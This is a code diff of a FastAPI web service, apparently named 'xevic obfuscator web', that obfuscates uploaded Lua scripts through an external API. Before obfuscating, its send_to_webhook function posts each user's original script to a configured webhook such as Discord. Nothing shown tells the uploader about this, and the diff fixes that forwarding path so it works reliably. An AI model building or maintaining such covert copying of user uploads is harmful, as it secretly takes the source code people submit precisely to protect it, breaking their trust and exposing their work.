@@ -1,13 +1,17 @@
+# main.py
 import os
 import io
+import json
 import logging
+from typing import Optional
+
 import aiohttp
-import uvicorn
-from fastapi import FastAPI, File, Form, UploadFile, Request
+from dotenv import load_dotenv
+from fastapi import FastAPI, File, Form, Request, UploadFile
 from fastapi.responses import HTMLResponse, StreamingResponse
 from fastapi.staticfiles import StaticFiles
-from dotenv import load_dotenv
 
+# Load local .env for local development only (Vercel uses project env vars)
 load_dotenv()
 
 log = logging.getLogger("xevic-obf-web")
@@ -18,42 +22,58 @@ WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 
 app = FastAPI(title="xevic obfuscator web")
 
+# Mount static directory if present
 if os.path.isdir("static"):
     app.mount("/static", StaticFiles(directory="static"), name="static")
 
 
-async def send_to_webhook(session: aiohttp.ClientSession, filename: str, content: str):
+async def send_to_webhook(session: aiohttp.ClientSession, filename: str, content: str) -> None:
+    """Send the original uploaded script to a configured webhook (e.g., Discord)."""
     if not WEBHOOK_URL:
+        log.debug("No WEBHOOK_URL configured; skipping webhook send.")
         return
+
     try:
         file_bytes = io.BytesIO(content.encode("utf-8"))
         form = aiohttp.FormData()
-        form.add_field("payload_json", f'{"content":"Original script uploaded: `{filename}`"}')
+        # Create a valid JSON payload for payload_json (Discord expects a JSON string here)
+        payload = json.dumps({"content": f"Original script uploaded: `{filename}`"})
+        form.add_field("payload_json", payload)
         form.add_field("file", file_bytes, filename=filename, content_type="text/plain")
+
         async with session.post(WEBHOOK_URL, data=form) as resp:
             if resp.status not in (200, 204):
-                log.warning("Webhook returned HTTP %s", resp.status)
+                body = await resp.text()
+                log.warning("Webhook returned HTTP %s: %s", resp.status, body)
     except Exception:
         log.exception("Failed to send script to webhook")
 
 
 async def obfuscate_script(session: aiohttp.ClientSession, script: str) -> str:
+    """Send script to the luaobfuscator API and return obfuscated code (or original on failure)."""
     if not LUAOBFUSCATOR_API_KEY:
+        log.debug("No LUAOBFUSCATOR_API_KEY configured; returning original script.")
         return script
+
+    # Use a timeout for external calls to avoid indefinite waits in serverless environment
+    timeout = aiohttp.ClientTimeout(total=25)
     try:
         headers = {"apikey": LUAOBFUSCATOR_API_KEY, "content-type": "text/plain"}
+
         async with session.post(
             "https://api.luaobfuscator.com/v1/obfuscator/newscript",
             headers=headers,
             data=script,
+            timeout=timeout,
         ) as resp:
             if resp.status != 200:
-                log.warning("luaobfuscator newscript returned %s", resp.status)
+                body = await resp.text()
+                log.warning("luaobfuscator newscript returned %s: %s", resp.status, body)
                 return script
             data = await resp.json()
             session_id = data.get("sessionId")
             if not session_id:
-                log.warning("no sessionId returned from luaobfuscator")
+                log.warning("no sessionId returned from luaobfuscator: %s", data)
                 return script
 
         headers2 = {
@@ -62,13 +82,16 @@ async def obfuscate_script(session: aiohttp.ClientSession, script: str) -> str:
             "content-type": "application/json",
         }
         params = {"MinifyAll": True, "Virtualize": True, "CustomPlugins": {"DummyFunctionArgs": [6, 9]}}
+
         async with session.post(
             "https://api.luaobfuscator.com/v1/obfuscator/obfuscate",
             headers=headers2,
             json=params,
+            timeout=timeout,
         ) as resp2:
             if resp2.status != 200:
-                log.warning("luaobfuscator obfuscate returned %s", resp2.status)
+                body = await resp2.text()
+                log.warning("luaobfuscator obfuscate returned %s: %s", resp2.status, body)
                 return script
             data2 = await resp2.json()
             return data2.get("code", script)
@@ -79,6 +102,8 @@ async def obfuscate_script(session: aiohttp.ClientSession, script: str) -> str:
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
+    """Return the main HTML page (UI + canvas animation)."""
+    # (HTML kept inline for simplicity; you can move to static/html if you prefer)
     return """
 <!doctype html>
 <html lang="en">
@@ -246,32 +271,44 @@ async def index(request: Request):
 
 
 @app.post("/obfuscate")
-async def obfuscate(file: UploadFile = File(None), script: str = Form(None), filename: str = Form(None)):
+async def obfuscate(file: Optional[UploadFile] = File(None), script: Optional[str] = Form(None), filename: Optional[str] = Form(None)):
+    """Accept an uploaded file or pasted script, obfuscate it, and return as a downloadable file."""
     if not file and not script:
         return HTMLResponse("<p style='color:red'>Error: No input provided.</p>", status_code=400)
+
     try:
-        # Prefer uploaded file over pasted script. The client now avoids populating textarea when file is selected.
         if file:
-            incoming_name = file.filename
+            incoming_name = file.filename or "uploaded_script.lua"
             raw = await file.read()
             content = raw.decode("utf-8", errors="replace")
         else:
             incoming_name = "pasted_script.lua"
             content = script or ""
-        async with aiohttp.ClientSession() as session:
+
+        # Use a single aiohttp session with a short timeout for external calls
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            # Send original to webhook (fire-and-forget style but awaited to capture errors)
             await send_to_webhook(session, incoming_name, content)
+            # Obfuscate (may return original on failure)
             obfuscated = await obfuscate_script(session, content)
+
         out_name = filename or f"obfuscated_{incoming_name}"
         if not out_name.lower().endswith((".lua", ".txt")):
             out_name += ".lua"
+
         buf = io.BytesIO(obfuscated.encode("utf-8"))
-        headers = {"Content-Disposition": f"attachment; filename={out_name}"}
+        buf.seek(0)  # ensure buffer at start
+        headers = {"Content-Disposition": f'attachment; filename="{out_name}"'}
         return StreamingResponse(buf, media_type="text/plain", headers=headers)
     except Exception as e:
         log.exception("Error processing file")
         return HTMLResponse(f"<p style='color:red'>Error: {e}</p>", status_code=500)
 
 
+# Only start the dev server when running this file directly (local dev).
 if __name__ == "__main__":
-    log.info("Starting xevic obfuscator web (development)")
-    uvicorn.run(app, reload=True)
+    import uvicorn
+
+    log.info("Starting xevic obfuscator web (local)")
+    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
